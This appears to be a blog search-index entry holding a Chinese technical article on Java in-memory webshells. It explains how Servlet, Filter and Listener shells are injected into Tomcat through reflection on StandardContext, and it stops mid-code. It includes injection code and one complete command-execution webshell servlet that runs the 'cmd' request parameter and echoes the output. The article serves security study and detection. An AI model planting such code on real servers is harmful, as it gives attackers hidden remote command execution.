<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>『Java内存马』Java内存马攻防技术</title>
      <link href="/posts/7a66.html"/>
      <url>/posts/7a66.html</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中，我们介绍了java内存马基础知识，以及如何使用RASP技术检测java内存马。本文主要介绍 Java 内存马攻防技术，包括对Java内存马实现原理与现有检测方法的研究。</p><h1 id="java内存马的实现原理"><a class="markdownIt-Anchor" href="#java内存马的实现原理"></a> Java内存马的实现原理</h1><p>在现有的 Java 内存马攻击中，除了 Agent 型内存马，其他类型的 Java 内存马通常是通过利用Web容器、中间件的内部组件实现恶意对象的加载，例如 Listener、Filter、Servlet 或 Valve 等。这些组件是容器运行时的核心部分，攻击者通过反射技术操作这些组件，可以将恶意代码注册到容器的运行环境中。</p><p>例如，攻击者可以通过反射动态创建一个恶意的Servlet实例，并将其映射到特定的 URL 路径，或者注册一个恶意的 Filter，使其在请求处理过程中被触发。以下是一个具体的代码示例，展示了如何通过反射技术动态注册一个恶意的 Servlet 到 Tomcat 容器中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 恶意逻辑：执行命令</span></span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerServlet</span><span class="params">(StandardContext context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建恶意Servlet实例</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">        wrapper.setName(<span class="string">&quot;MemoryServlet&quot;</span>);</span><br><span class="line">        wrapper.setServletClass(MemoryServlet.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意Servlet添加到容器中</span></span><br><span class="line">        context.addChild(wrapper);</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/trigger&quot;</span>, <span class="string">&quot;MemoryServlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，MemoryServlet是一个简单的恶意Servlet，它在接收到HTTP请求时会触发一个命令执行操作（例如打开计算器）。通过反射技术，攻击者可以获取Tomcat的StandardContext对象，并调用addChild方法将恶意Servlet注册到容器中。同时，通过addServletMappingDecoded方法将恶意Servlet映射到一个特定的路径（如/trigger），这样当攻击者访问该路径时，就会触发恶意逻辑。</p><p><strong>而 Java 内存马的利用点</strong>往往隐藏在Web应用的Controller层中，其触发机制通常依赖于特定的HTTP请求或参数，这是其与传统Web攻击相似的地方。攻击者会设计一个特定的触发条件，例如通过在HTTP请求中包含某个特定的参数或路径来激活恶意代码。以下是一个简单的代码示例，展示了如何通过HTTP请求触发恶意逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/trigger&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TriggerServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 检查请求中是否包含特定参数，例如 &quot;cmd&quot;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 恶意逻辑</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().println(<span class="string">&quot;No command provided.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，TriggerServlet 是一个简单的 Servlet，它通过检查HTTP请求中的cmd参数来触发恶意逻辑。这种触发机制的设计使得内存马能够在不被轻易发现的情况下，根据外部输入动态执行恶意操作，如命令执行、数据窃取等。由于触发条件通常隐藏在HTTP请求中，且恶意代码仅存在于内存中，因此内存马的触发行为难以被传统的安全工具检测到。这种隐蔽性和动态性使得内存马成为一种极具威胁且难以防范的攻击手段。</p><h1 id="java内存马的分类"><a class="markdownIt-Anchor" href="#java内存马的分类"></a> Java内存马的分类</h1><p>目前主流的Java内存根据实现原理可以分为<strong>传统Web应用型内存马、框架型内存马、中间件型内存马、Agent型内存马和新型内存马</strong>五类。其中，传统Web应用型内存马主要通过Java EE原生的Servlet-API来实现动态注册，从而实现恶意行为。框架型内存马主要利用各种如Spring的主流开发框架的特性进行恶意组件的恶意动态注册。中间件型内存马通过劫持中间件注入恶意代码，将其注册为中间件的关键组件，从而在无文件落地的情况下实现恶意操作。Agent型内存马利用Java Agent技术实现内存马逻辑的植入，具有变体众多、扩展性强的特点。新型内存马则通过各种新型技术，利用JVM底层机制、各类通信协议和各种框架机制进行内存马逻辑的深度植入，将攻击逻辑更深地嵌入JVM运行时，显著提升其隐蔽性。</p><h2 id="传统web应用型内存马"><a class="markdownIt-Anchor" href="#传统web应用型内存马"></a> 传统Web应用型内存马</h2><p>传统的Web应用型Java内存马通常依赖于Java EE中的组件实现恶意字节码的注入。Java EE作为Java的企业级扩展，在Java SE的基础上扩展了一套标准化的技术规范和API，从而构建企业级的应用程序，这其中也包括Web服务的支持。</p><p>Java Servlet API为Java EE中规定的组件，主要用于Web请求和响应，为构建Java Web应用的核心技术。其最常用的主要组件有Servlet、Filter、Listener等。其中，Servlet为服务端的Java应用程序，用于处理具体的HTTP请求和响应，主要处理业务逻辑；Filter是介于Web容器和Servlet之间的过滤器，主要对请求和响应进行拦截和过滤，多用于数据预处理、后处理或权限控制等。在请求到达Servlet之前，会先被一系列的Filter拦截进行处理。同样，当响应从Servlet返回时，也会通过一系列的Filter进行响应的处理再返回；Listener是用于监听某些Web应用中事件的监听器，如应用启动、关闭、会话创建、销毁等，当特定动作发生后，监听该动作的监听器就会自动调用对应的方法。Listener常常被用于管理应用的生命周期。</p><p>当我们在请求一个实现了Servlet API规范的Java Web应用时，程序会首先自动执行Listener监听器的内容，再去执行Filter过滤器。当存在多个过滤器时，则会组成过滤链，最后一个过滤器将会去执行Servlet的service方法，过程可以大致表现为<strong>Listener-&gt;Filter-&gt;Servlet</strong>。传统Web应用型内存马的技术本质是对该请求处理链的动态劫持。通过利用Java Web应用的核心处理逻辑，将恶意代码动态注入到Servlet、Filter和Listener等关键组件中，从而在内存中构建可持久化控制的恶意通道。</p><p>通常情况下，Servlet、Filter和Listener的配置在配置文件和注解中，如若需要在他处注册，可通过调用Java EE定义的Servlet API的相关接口。然而，此种方法一般只能在应用启动时阶段完成注册，运行时动态注册可能不被支持且被认为线程不安全。因此，主流的传统Web应用型内存马实现方式多使用中间件提供的相关接口，如，通过Tomcat多次反射获取StandardContext对象并利用其在Web应用运行时进行恶意类的注入。</p><h3 id="servlet-型内存马"><a class="markdownIt-Anchor" href="#servlet-型内存马"></a> Servlet 型内存马</h3><p>Servlet型内存马通过运行时动态注册恶意Servlet，并实现恶意路由的注册，从而实现恶意HTTP请求的处理。其存在动态注册、路由劫持、内存驻留等特点。其中，<strong>动态注册</strong>指其绕过了web.xml或注解，实现运行时注入Servlet；<strong>路由劫持</strong>指其通过绑定高优先级的URL或注册新的恶意URL，实现合法路由的覆盖或恶意路由的隐藏；<strong>内存驻留</strong>指恶意Servlet类全程驻留内存，无文件落地，规避了传统的查杀方案。一个经典的Servlet型内存马的基本流程可以概括为几步：首先获取ServletContext；进一步地，获取Tomcat所对应的StandardContext；接着构建Servlet Wrapper；最后，将构建好的Wrapper添加到StandardContext，并加入Mappings，实现恶意路由注册。</p><blockquote><ul><li><strong><code>ServletContext</code></strong>： <strong>开发者用的接口</strong>，是对容器内部实现的一层“包装”或“门面”。</li><li><strong><code>StandardContext</code> ：是 Tomcat 中用于表示一个完整 Web 应用的容器组件。<strong>它是 <code>Context</code> 接口的标准实现，负责管理这个 Web 应用中的所有 Servlet、Filter、Listener、资源路径、会话等信息，可以</strong>控制 Filter、Listener、Session 配置等</strong></li></ul></blockquote><p>此种实现方式的内存马利用了Tomcat中间件。作为Java Web生态中广泛应用的Servlet容器，Tomcat通过分层式容器模型管理Servlet生命周期，共拥有四种类型的容器，从上到下分别为Engine、Host、Context、Wrapper。每一个Wrapper实例表示了一个具体的Servlet定义，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper的主要任务就是载入Servlet类并且进行实例化），Context作为Web应用的逻辑载体，内部维护的Wrapper队列实质上构成了Servlet实例的孵化池。当攻击者通过反射机制获取StandardContext对象后，便可绕过常规部署流程，直接创建StandardWrapper实例，将Servlet类名及URL定义等植入容器，从而绕过web.xml实现运行时注入。</p><p>下面是一个典型的Servlet内存马的实现方式。首先，定义恶意Servlet类，并定义构造函数。使其在注入后可以将自己注册到StandardContext中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// 无参构造函数，定义了恶意 Servlet 的初始化操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilServlet</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        <span class="comment">// 此处为恶意逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>然后，检查当前是否有存在同名的Servlet注册，如果没有的话就通过递归反射继续获取StandardContext：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新建一个空 StandardContext， 用于存储 Tomcat 的 StandardContext 实例</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 通过反射不断查找 StandardContext</span></span><br><span class="line"><span class="comment">// Tomcat 的内部结构可能封装了多个层次的 ServletContext，因此代码需要不断通过反射向内层递归查找，直到找到 StandardContext。</span></span><br><span class="line"><span class="keyword">while</span> (standardContext == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">// 获取 ServletContext 类中的私有字段 &quot;context&quot;</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    contextField.setAccessible(<span class="literal">true</span>);<span class="comment">// 通过反射设置可访问私有字段</span></span><br><span class="line">    <span class="comment">// 获取 &quot;context&quot; 字段的值</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">contextObject</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line">    <span class="comment">// 判断是否仍然是 ServletContext 类型，继续获取内部的上下文</span></span><br><span class="line">    <span class="keyword">if</span>(contextObject <span class="keyword">instanceof</span> ServletContext)&#123;</span><br><span class="line">        servletContext = (ServletContext) contextObject; <span class="comment">// 递归继续查找</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(contextObject <span class="keyword">instanceof</span> StandardContext)&#123;</span><br><span class="line">        standardContext = (StandardContext) contextObject; <span class="comment">// 找到 StandardContext 对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Tomcat 中的 <code>ServletContext</code> 是一个接口，实际上在运行中是由多个不同类层层包装（装饰器模式）实现的，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ApplicationServletContext</span><br><span class="line"> → ApplicationContextFacade</span><br><span class="line">   → ApplicationContext</span><br><span class="line">     → StandardContext</span><br></pre></td></tr></table></figure><p>这些封装层使得开发者无法直接访问 Tomcat 核心的 <code>StandardContext</code>，因此需要通过<strong>反射递归访问私有字段</strong>，逐层剥离，直到找到真实的 <code>StandardContext</code> 对象。</p><p>所以这段代码中，每轮循环都尝试往内层剥离 <code>ServletContext</code>，得到的对象可能是另一个 <code>ServletContext</code> 的实现，也可能已经是 <code>StandardContext</code>，递归直到找到StandardContext 对象为止</p></blockquote><p>获取StandardContext后，创建一个Servlet包装器，用于封装恶意Servlet：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个新的 Servlet 包装器 (Wrapper)，用于封装 Servlet</span></span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setName(servletName); <span class="comment">// 设置 Servlet 的名称为 &quot;bad&quot;</span></span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>); <span class="comment">// 设置 Servlet 在启动时加载</span></span><br><span class="line">wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>(<span class="string">&quot;whatever&quot;</span>));<span class="comment">// 实例化并设置新的 Servlet</span></span><br><span class="line">wrapper.setServletClass(EvilServlet.class.getName());<span class="comment">// 设置 Servlet 类名</span></span><br><span class="line"><span class="comment">// 将包装的 Servlet 注册到 StandardContext 中</span></span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"><span class="comment">// 将 URL 映射 &quot;/bad&quot; 关联到 &quot;bad&quot; 这个 Servlet</span></span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/bad&quot;</span>,servletName);</span><br></pre></td></tr></table></figure><p>最后，定义恶意Servlet类的核心方法，doGet，用于处理HTTP请求，其具体作用为实现任意代码执行并回显在页面。为简洁起见，后文将省略类似恶意方法或恶意代码逻辑的实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Servlet 的核心方法，用于处理 HTTP GET 请求</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Injected Code Working&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(process.getInputStream());</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">                    output.append(scanner.nextLine()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                scanner.close();</span><br><span class="line"></span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">                out.write(output.toString());</span><br><span class="line">                out.flush();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                out.write(<span class="string">&quot;Inject Complete ?cmd=&lt;command&gt;&quot;</span>);</span><br><span class="line">                out.flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="filter型内存马"><a class="markdownIt-Anchor" href="#filter型内存马"></a> Filter型内存马</h3><p><strong>当目标系统采用URI白名单验证机制时，通过传统Servlet型内存马注入新路径的攻击方法将彻底失效，因为所有未经验证的访问路径都会被安全网关拦截，造成内存马无法被外部访问的情况</strong>。而Filter型内存马可以绕过这种防护手段。</p><p>Filter容器用于对请求和响应进行过滤和处理。客户端的请求在传递到Servlet之前会先经过Fliter。那么，如果攻击者动态创建一个含有恶意代码的Filter并将其放在Filter链的头部，那么该Filter就会最先被执行，实现Filter型的内存马。即，恶意Filter的注入将使得攻击者无需依赖特定路由，只需在Filter链的头部插入自定义逻辑，即可对所有经过容器的请求实施无差别监听，从而规避目标系统的路径校验机制。</p><p>一个典型的Filter型内存马的的基本流程可概括为：首先，获取ServletContext；进一步地，获取Tomcat所对应的StandardContext；然后，定义新的恶意Filter类，内嵌恶意代码；之后，实例化新的FilterDef，并通过StandardContext.addFilterDef()注册在应用上下文中；最后，实例化新的FilterMap类，将恶意Filter和urlpattern相对应，并通过standardContext.addFilterMap()注册在应用上下文中。</p><p>下面来分析一个恶意Filter的实现方式。首先，定义一个EvilFilter类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilFilter</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个私有函数，实现获取StandardContext的作用，实现原理如上文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> context.getServletContext();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(standardContext == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">contextObject</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line">        <span class="keyword">if</span>(contextObject <span class="keyword">instanceof</span> ServletContext)&#123;</span><br><span class="line">            servletContext = (ServletContext) contextObject;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(contextObject <span class="keyword">instanceof</span> StandardContext)&#123;</span><br><span class="line">            standardContext = (StandardContext) contextObject;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> standardContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，在构造函数中定义一个新Filter，实现恶意Filter的定义，然后，将恶意Filter注册进StandardContext，并将其应用于任意URL。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> <span class="string">&quot;filtertrojan&quot;</span>;</span><br><span class="line"><span class="comment">// 检查是否已经存在这个Filter</span></span><br><span class="line"><span class="keyword">if</span>(standardContext.findFilterDef(filtername)==<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">// 定义一个匿名的Filter实例</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Init Filter Trojan Complete&quot;</span>); <span class="comment">// 用于测试</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="comment">// 此处为恶意逻辑</span></span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 继续执行过滤链中的其他过滤器</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="listener型内存马"><a class="markdownIt-Anchor" href="#listener型内存马"></a> Listener型内存马</h3><p>Listener基于特定事件触发，基于不同类型的Listener会在不同时间触发。而在一系列的Listener中，对于内存马而言最好用的是ServletRequestListener。ServletRequestListener会在每次请求传入时触发。其存在两个核心方法：requestInitialized和requestDestroyed。前者在每次请求进入时触发，适合记录请求日志或统计访问量；后者在请求处理完成、即将返回响应时触发，可以用于释放与请求相关的资源。</p><p>一个典型的Listener型内存马的流程大概为：首先，继承或编写一个Listener；其次，获取StandardContext；最后，通过StandardContext.addApplicationEventListener()添加恶意Listener。</p><p>下面来分析一个经典的恶意Listener实现方式。首先，定义一个EvilListener类，并定义构造函数和一个获取StandardContext的私有函数，后者实现方式如上文，此处不再赘述。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilListener</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，在构造函数中新定义一个ServletRequestListener类，并写入恶意逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext();</span><br><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LISTENER REQUEST DESTROYED&quot;</span>);</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdlistener&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">// 此处为恶意逻辑</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LISTENER REQUEST 